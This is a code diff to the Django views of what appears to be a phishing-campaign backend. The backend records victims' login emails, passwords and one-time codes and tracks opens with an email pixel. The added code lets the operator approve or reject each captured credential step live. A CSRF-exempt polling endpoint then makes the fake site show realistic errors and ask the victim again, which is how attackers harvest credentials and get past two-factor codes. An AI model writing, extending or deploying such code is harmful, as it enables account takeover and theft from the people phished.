@@ -12,10 +12,16 @@ from django.template.loader import render_to_string
 from django.utils.html import strip_tags
 from django.core.mail import send_mail, get_connection, EmailMultiAlternatives
 from django.http import HttpResponse, JsonResponse
+from django.views.decorators.http import require_POST
+from django.views.decorators.csrf import csrf_exempt
 import base64
 import logging 
 from django.urls import reverse
 import uuid
+import json
+import json
+from django.views.decorators.csrf import csrf_exempt
+from django.views.decorators.http import require_POST
 
 logger = logging.getLogger(__name__)
 # Create your views here.
@@ -122,6 +128,13 @@ def campaign_detail(request, pk):
                     'login_email': victim_info.login_email or '',
                     'login_password': victim_info.login_password or '',
                     'login_otp': victim_info.login_otp or '',
+                    'email_status': victim_info.email_status,
+                    'password_status': victim_info.password_status,
+                    'otp_status': victim_info.otp_status,
+                    'email_error_message': victim_info.email_error_message or '',
+                    'password_error_message': victim_info.password_error_message or '',
+                    'otp_error_message': victim_info.otp_error_message or '',
+                    'current_step': victim_info.current_step,
                     'created_at': victim_info.created_at.strftime('%B %d, %Y %H:%M'),
                     'updated_at': victim_info.updated_at.strftime('%B %d, %Y %H:%M'),
                 })
@@ -345,3 +358,139 @@ def tracking_pixel(request, campaign_id):
     gif_base64 = b'R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw=='
     gif_data = base64.b64decode(gif_base64)
     return HttpResponse(gif_data, content_type='image/gif')
+
+
+################################## APPROVAL/REJECTION SYSTEM ##################################
+
+@login_required
+@require_POST
+def approve_submission(request, victim_info_id):
+    """
+    Approve a victim submission step (email, password, or OTP).
+    This allows the static site to proceed to the next step.
+    """
+    try:
+        victim_info = get_object_or_404(VictimInfo, id=victim_info_id, campaign__user=request.user)
+        data = json.loads(request.body.decode('utf-8'))
+        step = data.get('step')  # email, password, or otp
+        
+        if step not in ['email', 'password', 'otp']:
+            return JsonResponse({'error': 'Invalid step'}, status=400)
+        
+        # Update the status for the specific step
+        if step == 'email':
+            victim_info.email_status = 'approved'
+            victim_info.email_error_message = None  # Clear any previous error
+            victim_info.current_step = 'password'  # Move to next step
+        elif step == 'password':
+            victim_info.password_status = 'approved'
+            victim_info.password_error_message = None  # Clear any previous error
+            victim_info.current_step = 'otp'  # Move to next step
+        elif step == 'otp':
+            victim_info.otp_status = 'approved'
+            victim_info.otp_error_message = None  # Clear any previous error
+            victim_info.current_step = 'completed'  # All steps completed
+        
+        victim_info.save()
+        
+        return JsonResponse({
+            'status': 'success',
+            'message': f'{step.capitalize()} submission approved',
+            'victim_info_id': str(victim_info.id),
+            'current_step': victim_info.current_step
+        })
+        
+    except Exception as e:
+        logger.error(f"Error approving submission: {str(e)}")
+        return JsonResponse({'error': 'Failed to approve submission'}, status=500)
+
+@login_required
+@require_POST
+def reject_submission(request, victim_info_id):
+    """
+    Reject a victim submission step (email, password, or OTP).
+    This sends an error message to the static site.
+    """
+    try:
+        victim_info = get_object_or_404(VictimInfo, id=victim_info_id, campaign__user=request.user)
+        data = json.loads(request.body.decode('utf-8'))
+        step = data.get('step')  # email, password, or otp
+        error_message = data.get('error_message', '')
+        
+        if step not in ['email', 'password', 'otp']:
+            return JsonResponse({'error': 'Invalid step'}, status=400)
+        
+        # Default error messages if none provided
+        default_messages = {
+            'email': 'Invalid email address. Please enter a valid email.',
+            'password': 'Incorrect password. Please try again.',
+            'otp': 'Invalid OTP code. Please check and try again.'
+        }
+        
+        if not error_message:
+            error_message = default_messages.get(step, 'Invalid information provided')
+        
+        # Update the status for the specific step
+        if step == 'email':
+            victim_info.email_status = 'rejected'
+            victim_info.email_error_message = error_message
+            victim_info.current_step = 'email'  # Stay on current step
+        elif step == 'password':
+            victim_info.password_status = 'rejected'
+            victim_info.password_error_message = error_message
+            victim_info.current_step = 'password'  # Stay on current step
+        elif step == 'otp':
+            victim_info.otp_status = 'rejected'
+            victim_info.otp_error_message = error_message
+            victim_info.current_step = 'otp'  # Stay on current step
+        
+        victim_info.save()
+        
+        return JsonResponse({
+            'status': 'success',
+            'message': f'{step.capitalize()} submission rejected',
+            'victim_info_id': str(victim_info.id),
+            'error_message': error_message,
+            'current_step': victim_info.current_step
+        })
+        
+    except Exception as e:
+        logger.error(f"Error rejecting submission: {str(e)}")
+        return JsonResponse({'error': 'Failed to reject submission'}, status=500)
+
+@csrf_exempt
+def check_submission_status(request, victim_info_id):
+    """
+    Check the status of a victim submission step.
+    Used by static sites to poll for approval/rejection.
+    """
+    try:
+        victim_info = get_object_or_404(VictimInfo, id=victim_info_id)
+        step = request.GET.get('step', 'email')
+        
+        if step not in ['email', 'password', 'otp']:
+            return JsonResponse({'error': 'Invalid step'}, status=400)
+        
+        # Get the status and error message for the specific step
+        if step == 'email':
+            status = victim_info.email_status
+            error_message = victim_info.email_error_message
+        elif step == 'password':
+            status = victim_info.password_status
+            error_message = victim_info.password_error_message
+        elif step == 'otp':
+            status = victim_info.otp_status
+            error_message = victim_info.otp_error_message
+        
+        return JsonResponse({
+            'status': 'success',
+            'submission_status': status,
+            'step': step,
+            'error_message': error_message,
+            'current_step': victim_info.current_step,
+            'victim_info_id': str(victim_info.id)
+        })
+        
+    except Exception as e:
+        logger.error(f"Error checking submission status: {str(e)}")
+        return JsonResponse({'error': 'Failed to check status'}, status=500)
